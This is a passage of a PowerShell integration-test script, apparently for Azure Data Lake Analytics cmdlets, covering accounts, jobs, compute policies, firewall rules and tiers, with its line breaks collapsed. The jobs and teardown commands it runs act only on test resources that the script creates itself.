function Test-DataLakeAnalyticsJobRelationships{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountName$nowTime = $accountCreated.CreationTimeAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(300000)$guidForJob = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("relationTest01")$guidForJobRecurrence = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("relationTest02")$guidForJobPipeline = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("relationTest03")$guidForJobRun = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("relationTest04")$pipelineName = getAssetName$recurrenceName = getAssetName$pipelineUri = "https://begoldsm.contoso.com/jobs"[Microsoft.Azure.Commands.DataLakeAnalytics.Models.DataLakeAnalyticsClient]::JobIdQueue.Enqueue($guidForJob)$jobInfo = Submit-AdlJob `-AccountName $accountName `-Name "TestJob" `-Script "DROP DATABASE IF EXISTS foo; CREATE DATABASE foo;" `-PipelineId $guidForJobPipeline `-RecurrenceId $guidForJobRecurrence `-RecurrenceName $recurrenceName `-PipelineName $pipelineName `-PipelineUri $pipelineUri `-RunId $guidForJobRun$jobInfo = Wait-AdlJob -Account $accountName -JobId $jobInfo.JobIdAssert-NotNull {$jobInfo}Assert-AreEqual $guidForJobRecurrence $jobInfo.Related.RecurrenceIdAssert-AreEqual $guidForJobPipeline $jobInfo.Related.PipelineIdAssert-AreEqual $guidForJobRun $jobInfo.Related.RunIdAssert-AreEqual $pipelineName $jobInfo.Related.PipelineNameAssert-AreEqual $recurrenceName $jobInfo.Related.RecurrenceNameAssert-AreEqual $pipelineUri $jobInfo.Related.PipelineUri$jobList = Get-AdlJob -Account $accountName -PipelineId $guidForJobPipelineAssert-True {$jobList.Count -ge 1}$jobList = Get-AdlJob -Account $accountName -RecurrenceId $guidForJobRecurrenceAssert-True {$jobList.Count -ge 1}$recurrenceList = Get-AdlJobRecurrence -Account $accountNameAssert-True {$recurrenceList.Count -ge 1}$recurrence = Get-AdlJobRecurrence -Account $accountName -RecurrenceId $guidForJobRecurrenceAssert-AreEqual $recurrenceName $recurrence.RecurrenceNameAssert-AreEqual $guidForJobRecurrence $recurrence.RecurrenceId$pipelineList = Get-AdlJobPipeline -Account $accountNameAssert-True {$pipelineList.Count -ge 1}$pipeline = Get-AdlJobPipeline -Account $accountName -PipelineId $guidForJobPipelineAssert-AreEqual $pipelineName $pipeline.PipelineNameAssert-AreEqual $guidForJobPipeline $pipeline.PipelineId}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsComputePolicy{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationAssert-False {Test-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-False {Test-AdlAnalyticsAccount -Name $accountName}New-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.WindowsAzure.Commands.Utilities.Common.TestMockSupport]::Delay(30000)Assert-False {$i -eq 60} " Data Lake Analytics account is not in succeeded state even after 30 min."}Assert-True {Test-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}$userPolicyObjectId = "8ce05900-7a9e-4895-b3f0-0fbcee507803"$userPolicyName = getAssetName$groupPolicyObjectId = "0583cfd7-60f5-43f0-9597-68b85591fc69"$groupPolicyName = getAssetNameAssert-AreEqual 0 $accountCreated.ComputePolicies.Count 		Assert-Throws {New-AdlAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName  $accountName -Name $userPolicyName -ObjectId $userPolicyObjectId -ObjectType "User"}New-AdlAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName  $accountName -Name $userPolicyName -ObjectId $userPolicyObjectId -ObjectType "User" -MaxDegreeOfParallelismPerJob 2New-AdlAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName $accountName -Name $groupPolicyName -ObjectId $groupPolicyObjectId -ObjectType "Group" -MaxDegreeOfParallelismPerJob 2 -MinPriorityPerJob 2$policyResult = Get-AdlAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName $accountNameAssert-AreEqual 2 $policyResult.Count$singlePolicy = Get-AdlAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName $accountName -Name $userPolicyNameAssert-AreEqual $userPolicyName $singlePolicy.NameAssert-AreEqual 2 $singlePolicy.MaxDegreeOfParallelismPerJobAssert-Throws {Update-AdlAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName  $accountName -Name $userPolicyName}Update-AdlAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName  $accountName -Name $userPolicyName -MinPriorityPerJob 2$singlePolicy = Get-AdlAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName $accountName -Name $userPolicyNameAssert-AreEqual $userPolicyName $singlePolicy.NameAssert-AreEqual 2 $singlePolicy.MaxDegreeOfParallelismPerJobAssert-AreEqual 2 $singlePolicy.MinPriorityPerJobRemove-AdlAnalyticsComputePolicy -AccountName $accountName -Name $userPolicyNameAssert-Throws {Get-AdlAnalyticsComputePolicy -AccountName $accountName -Name $userPolicyName}}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsFirewall{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationAssert-False {Test-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-False {Test-AdlAnalyticsAccount -Name $accountName}New-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.WindowsAzure.Commands.Utilities.Common.TestMockSupport]::Delay(30000)Assert-False {$i -eq 60} " Data Lake Analytics account is not in succeeded state even after 30 min."}Assert-True {Test-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-AreEqual "Disabled" $accountCreated.FirewallState $accountSet = Set-AdlAnalyticsAccount -Name $accountName -FirewallState "Enabled" -AllowAzureIpState "Enabled"Assert-AreEqual "Enabled" $accountSet.FirewallState $firewallRuleName = getAssetName$startIp = "127.0.0.1"$endIp = "127.0.0.2"Add-AdlAnalyticsFirewallRule -AccountName $accountName -Name $firewallRuleName -StartIpAddress $startIp -EndIpAddress $endIp$result = Get-AdlAnalyticsFirewallRule -AccountName $accountName -Name $firewallRuleNameAssert-AreEqual $firewallRuleName $result.NameAssert-AreEqual $startIp $result.StartIpAddressAssert-AreEqual $endIp $result.EndIpAddressRemove-AdlAnalyticsFirewallRule -AccountName $accountName -Name $firewallRuleNameAssert-Throws {Get-AdlAnalyticsFirewallRule -AccountName $accountName -Name $firewallRuleName}}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsAccount{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$secondDataLakeAccountName = (Get-DataLakeStoreAccountName),$blobAccountName,$blobAccountKey,$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationAssert-False {Test-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-False {Test-AdlAnalyticsAccount -Name $accountName}New-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $locationNew-AdlStore -ResourceGroupName $resourceGroupName -Name $secondDataLakeAccountName -Location $location$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics account is not in succeeded state even after 30 min."}Assert-True {Test-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-True {Test-AdlAnalyticsAccount -Name $accountName}$tagsToUpdate = @{"TestTag" = "TestUpdate"}$accountUpdated = Set-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Tag $tagsToUpdateAssert-AreEqual $accountName $accountUpdated.NameAssert-AreEqual $location $accountUpdated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountUpdated.TypeAssert-True {$accountUpdated.Id -like "*$resourceGroupName*"}Assert-NotNull $accountUpdated.Tags "Tags do not exists"Assert-NotNull $accountUpdated.Tags["TestTag"] "The updated tag 'TestTag' does not exist"[array]$accountsInResourceGroup = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupNameAssert-True {$accountsInResourceGroup.Count -ge 1}$found = 0for ($i = 0; $i -lt $accountsInResourceGroup.Count; $i++){if ($accountsInResourceGroup[$i].Name -eq $accountName){$found = 1Assert-AreEqual $location $accountsInResourceGroup[$i].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountsInResourceGroup[$i].TypeAssert-True {$accountsInResourceGroup[$i].Id -like "*$resourceGroupName*"}break}}Assert-True {$found -eq 1} "Account created earlier is not found when listing all in resource group: $resourceGroupName."[array]$accountsInSubscription = Get-AdlAnalyticsAccountAssert-True {$accountsInSubscription.Count -ge 1}Assert-True {$accountsInSubscription.Count -ge $accountsInResourceGroup.Count}$found = 0for ($i = 0; $i -lt $accountsInSubscription.Count; $i++){if ($accountsInSubscription[$i].Name -eq $accountName){$found = 1Assert-AreEqual $location $accountsInSubscription[$i].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountsInSubscription[$i].TypeAssert-True {$accountsInSubscription[$i].Id -like "*$resourceGroupName*"}break}}Assert-True {$found -eq 1} "Account created earlier is not found when listing all in subscription."Add-AdlAnalyticsDataSource -Account $accountName -DataLakeStore $secondDataLakeAccountName$testStoreAdd = Get-AdlAnalyticsAccount -Name $accountNameAssert-AreEqual 2 $testStoreAdd.DataLakeStoreAccounts.Count$adlsAccountInfo = Get-AdlAnalyticsDataSource -Account $accountName -DataLakeStore $secondDataLakeAccountNameAssert-AreEqual $secondDataLakeAccountName $adlsAccountInfo.Name$adlsAccountInfos = Get-AdlAnalyticsDataSource -Account $accountNameAssert-AreEqual 2 $adlsAccountInfos.CountAssert-True {Remove-AdlAnalyticsDataSource -Account $accountName -DataLakeStore $secondDataLakeAccountName -Force -PassThru} "Remove Data Lake Store account failed."$testStoreAdd = Get-AdlAnalyticsAccount -Name $accountNameAssert-AreEqual 1 $testStoreAdd.DataLakeStoreAccounts.CountAdd-AdlAnalyticsDataSource -Account $accountName -Blob $blobAccountName -AccessKey $blobAccountKey$testStoreAdd = Get-AdlAnalyticsAccount -Name $accountNameAssert-AreEqual 1 $testStoreAdd.StorageAccounts.Count$blobAccountInfo = Get-AdlAnalyticsDataSource -Account $accountName -Blob $blobAccountNameAssert-AreEqual $blobAccountName $blobAccountInfo.Name$blobAccountInfos = Get-AdlAnalyticsDataSource -Account $accountNameAssert-AreEqual 2 $blobAccountInfos.CountAssert-True {Remove-AdlAnalyticsDataSource -Account $accountName -Blob $blobAccountName -Force -PassThru} "Remove blob Storage account failed."$testStoreAdd = Get-AdlAnalyticsAccount -Name $accountNameAssert-True {$testStoreAdd.StorageAccounts -eq $null -or $testStoreAdd.StorageAccounts.Count -eq 0} "Remove blob storage reported success but failed to remove the account."Assert-True {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $secondDataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsAccountTiers{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationAssert-False {Test-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-False {Test-AdlAnalyticsAccount -Name $accountName}New-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual "Consumption" $accountCreated.CurrentTierAssert-AreEqual "Consumption" $accountCreated.NewTier$accountUpdated = Set-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Tier Commitment100AUHoursAssert-AreEqual "Consumption" $accountUpdated.CurrentTierAssert-AreEqual "Commitment100AUHours" $accountUpdated.NewTier$secondAccountName = (Get-DataLakeAnalyticsAccountName)$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $secondAccountName -Location $location -DefaultDataLakeStore $dataLakeAccountName -Tier Commitment100AUHoursAssert-AreEqual "Commitment100AUHours" $accountCreated.CurrentTierAssert-AreEqual "Commitment100AUHours" $accountCreated.NewTier}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $secondAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsJob{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountName$nowTime = $accountCreated.CreationTimeAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(300000)$guidForJob = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("jobTest02")[Microsoft.Azure.Commands.DataLakeAnalytics.Models.DataLakeAnalyticsClient]::JobIdQueue.Enqueue($guidForJob)$jobInfo = Submit-AdlJob -AccountName $accountName -Name "TestJob" -Script "DROP DATABASE IF EXISTS foo; CREATE DATABASE foo;"Assert-NotNull {$jobInfo}Stop-AdlJob -AccountName $accountName -JobId $jobInfo.JobId -Force$cancelledJob = Get-AdlJob -AccountName $accountName -JobId $jobInfo.JobIdAssert-NotNull {$cancelledJob}Assert-True {$cancelledJob.Result -like "*Cancel*"}Assert-NotNull {Get-AdlJob -AccountName $accountName}$jobsWithDateOffset = Get-AdlJob -AccountName $accountName -SubmittedAfter $([DateTimeOffset]($nowTime).AddMinutes(-10))Assert-True {$jobsWithDateOffset.Count -gt 0} "Failed to retrieve jobs submitted after ten miuntes ago"$jobsWithDateOffset = Get-AdlJob -AccountName $accountName -SubmittedBefore $([DateTimeOffset]($nowTime).AddMinutes(10))Assert-True {$jobsWithDateOffset.Count -gt 0} "Failed to retrieve jobs submitted before right now"$guidForJob = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("jobTest04")[Microsoft.Azure.Commands.DataLakeAnalytics.Models.DataLakeAnalyticsClient]::JobIdQueue.Enqueue($guidForJob)$parameters = [ordered]@{}$parameters["byte_type"] = [byte]0$parameters["sbyte_type"] = [sbyte]1$parameters["int_type"] = [int32]2$parameters["uint_type"] = [uint32]3$parameters["long_type"] = [int64]4$parameters["ulong_type"] = [uint64]5$parameters["float_type"] = [float]6$parameters["double_type"] = [double]7$parameters["decimal_type"] = [decimal]8$parameters["short_type"] = [int16]9$parameters["ushort_type"] = [uint16]10$parameters["char_type"] = [char]"a"$parameters["string_type"] = "test"$parameters["datetime_type"] = [DateTime](Get-Date -Date "2018-01-01 00:00:00")$parameters["bool_type"] = $true$parameters["guid_type"] = [guid]"8dbdd1e8-0675-4cf2-a7f7-5e376fa43c6d"$parameters["bytearray_type"] = [byte[]]@(0, 1, 2)$expectedScript = "DECLARE @byte_type byte = 0;`nDECLARE @sbyte_type sbyte = 1;`nDECLARE @int_type int = 2;`nDECLARE @uint_type uint = 3;`nDECLARE @long_type long = 4;`nDECLARE @ulong_type ulong = 5;`nDECLARE @float_type float = 6;`nDECLARE @double_type double = 7;`nDECLARE @decimal_type decimal = 8;`nDECLARE @short_type short = 9;`nDECLARE @ushort_type ushort = 10;`nDECLARE @char_type char = 'a';`nDECLARE @string_type string = `"test`";`nDECLARE @datetime_type DateTime = new DateTime(2018, 1, 1, 0, 0, 0, 0);`nDECLARE @bool_type bool = true;`nDECLARE @guid_type Guid = new Guid(`"8dbdd1e8-0675-4cf2-a7f7-5e376fa43c6d`");`nDECLARE @bytearray_type byte[] = new byte[] {`n  0,`n  1,`n  2,`n};`nDROP DATABASE IF EXISTS foo; CREATE DATABASE foo;"$jobInfo = Submit-AdlJob -AccountName $accountName -Name "TestJob" -Script "DROP DATABASE IF EXISTS foo; CREATE DATABASE foo;" -ScriptParameter $parametersAssert-NotNull {$jobInfo}$jobInfo = Wait-AdlJob -Account $accountName -JobId $jobInfo.JobIdAssert-NotNull {$jobInfo}Assert-AreEqual "Succeeded" $jobInfo.ResultAssert-AreEqual $expectedScript $jobInfo.Properties.ScriptAssert-True {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-NegativeDataLakeAnalyticsAccount{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$location = "West US",$dataLakeAccountName = (Get-DataLakeStoreAccountName),$fakeaccountName = "psfakedataLakeAnalyticsaccounttest")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}Assert-Throws {New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountName}$tagsToUpdate = @{"TestTag" = "TestUpdate"}Assert-Throws {Set-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $fakeaccountName -Tag $tagsToUpdate}Assert-Throws {Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $fakeaccountName}Assert-True {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru}Assert-Throws {Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-NegativeDataLakeAnalyticsJob{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountName$nowTime = $accountCreated.CreationTimeAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}Assert-Throws {Stop-AdlJob -AccountName $accountName -JobIdentity [Guid]::Empty}Assert-Throws {Get-AdlJob -AccountName $accountName -JobIdentity [Guid]::Empty}Assert-Throws {Get-AdlJobDebugInfo -AccountName $accountName -JobIdentity [Guid]::Empty}$jobsWithDateOffset = Get-AdlJob -AccountName $accountName -SubmittedAfter $([DateTimeOffset]$nowTime)Assert-True {$jobsWithDateOffset.Count -eq 0} "Retrieval of jobs submitted after right now returned results and should not 